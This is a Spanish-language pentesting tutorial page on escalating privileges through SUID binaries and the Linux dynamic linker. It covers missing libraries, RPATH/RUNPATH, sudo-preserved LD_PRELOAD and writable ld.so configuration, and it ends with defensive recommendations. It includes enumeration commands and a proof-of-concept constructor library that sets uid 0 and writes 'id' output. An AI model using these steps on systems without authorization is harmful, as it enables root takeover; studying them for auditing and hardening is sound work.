# SUID Shared Library y Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

Los binarios SUID suelen revisarse en busca de ejecución directa de comandos, pero los programas SUID personalizados también pueden ser vulnerables a través del dynamic linker. El tema común es simple: un ejecutable con privilegios carga código desde una ruta o configuración que un usuario con menos privilegios puede controlar.

Esta página se centra en patrones de técnicas genéricas: librerías faltantes, directorios de librerías con permisos de escritura, `RPATH`/`RUNPATH`, `LD_PRELOAD` mediante sudo, configuración del linker y confusión de hardlinks SUID.

## Enumeración rápida

Empieza buscando archivos SUID inusuales y comprobando si están enlazados dinámicamente:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Concéntrate en ubicaciones no estándar, rutas de aplicaciones personalizadas, binarios propiedad de root pero fuera de directorios gestionados por paquetes y dependencias cargadas desde directorios con permisos de escritura.

Comprobaciones útiles de permisos de escritura:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Inyección de objetos compartidos faltantes

Algunos binarios SUID personalizados intentan cargar un objeto compartido que no existe. Si la ruta faltante se encuentra bajo un directorio controlado por el atacante, el binario puede cargar código proporcionado por el atacante como el usuario efectivo.

Busca búsquedas fallidas de bibliotecas:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Si el binario busca `libexample.so` en una ruta con permisos de escritura, una biblioteca de prueba mínima puede utilizar un constructor. Mantén la demostración del impacto inocua durante la validación:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Compílalo con el nombre de archivo exacto que el binario intenta cargar:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
La condición explotable no es únicamente la ausencia de la library. El attacker debe poder colocar un objeto compartido compatible en una ruta que el loader con privilegios acepte.

## Writable Library Directory

A veces todas las dependencias existen, pero uno de los directorios utilizados para resolverlas tiene permisos de escritura. Esto puede permitir reemplazar una library cargada o colocar una library con mayor prioridad y el mismo nombre.

Revisa las rutas de las dependencias:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Si el directorio permite escritura, valídalo con un enfoque seguro basado en copias en un laboratorio. Reemplazar system libraries en un host activo puede interrumpir la autenticación, la gestión de paquetes o los servicios críticos para el arranque.

## RPATH y RUNPATH

`RPATH` y `RUNPATH` son entradas de la sección dinámica que indican al loader dónde buscar libraries. Son peligrosas en programas SUID cuando apuntan a directorios controlables por un atacante.

Detéctalas:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Ejemplo de salida riesgosa:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Si `/opt/app/lib` tiene permisos de escritura y el binario necesita `libcustom.so`, el atacante podría colocar allí una `libcustom.so` maliciosa:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` y `RUNPATH` no son idénticos en todos los detalles de resolución, pero para revisar una escalada de privilegios la pregunta práctica es la misma: ¿el binario SUID busca el nombre de una library en un directorio modificable por el atacante?

## LD_PRELOAD, LD_LIBRARY_PATH y SUID

En los programas normales, `LD_PRELOAD` y `LD_LIBRARY_PATH` pueden forzar o influir en la carga de shared objects. En los programas SUID, el dynamic loader normalmente entra en secure-execution mode e ignora las variables de entorno peligrosas.

Esto significa que un binario SUID común normalmente no es vulnerable solo porque el usuario pueda establecer `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
La excepción común es una configuración incorrecta de sudo. Si `sudo -l` muestra que se conserva una variable como `LD_PRELOAD` o `LD_LIBRARY_PATH`, un comando permitido por sudo puede cargar código controlado por el atacante:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
No confundas estos casos:

- `LD_PRELOAD` contra un binario SUID normal: normalmente bloqueado por la ejecución segura.
- `LD_PRELOAD` conservado por sudo: potencialmente explotable.
- `.so` faltante en una ruta con permisos de escritura: explotable cuando el binario SUID carga naturalmente esa ruta.
- `RPATH`/`RUNPATH` hacia un directorio con permisos de escritura: explotable cuando se puede controlar una library necesaria.
- Acceso de escritura a `/etc/ld.so.preload` o a la configuración del linker: afecta a todo el sistema y tiene un alto impacto.

## Configuración del linker

El linker dinámico también lee la configuración del sistema, como `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, la caché del linker y, en algunos casos, `/etc/ld.so.preload`.

Comprobaciones de alto valor:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Una configuración del linker con permisos de escritura suele ser más grave que un único binario SUID vulnerable, porque puede afectar a muchos procesos enlazados dinámicamente. `/etc/ld.so.preload` es especialmente peligroso porque puede forzar la carga de un objeto compartido en procesos privilegiados.

## SUID Hardlink Confusion

Los Hardlinks pueden hacer que el mismo inode SUID aparezca con varios nombres. Esto resulta útil para ocultar un helper privilegiado, confundir las tareas de limpieza o eludir revisiones ingenuas basadas en rutas.

Busca archivos SUID con más de un enlace:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Inspecciona todas las rutas al mismo inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
El abuso no consiste en que un hardlink cambie los permisos. El abuso es la confusión de rutas: un inode privilegiado puede ser accesible mediante un nombre que los defensores o scripts no esperan. Para obtener más información sobre el flujo de trabajo de inodes y hardlinks, consulta [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Notas defensivas

- Mantén los binarios SUID mínimos, auditados y gestionados mediante paquetes siempre que sea posible.
- Evita entradas `RPATH`/`RUNPATH` que apunten a directorios modificables o gestionados por aplicaciones.
- Mantén los directorios de librerías bajo propiedad de root y sin permisos de escritura para usuarios normales.
- No conserves `LD_PRELOAD`, `LD_LIBRARY_PATH` ni variables similares del loader mediante sudo.
- Supervisa `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` y los archivos SUID inesperados.
- Revisa los archivos SUID enlazados mediante hardlinks e investiga los wrappers SUID personalizados fuera de las rutas estándar del sistema.
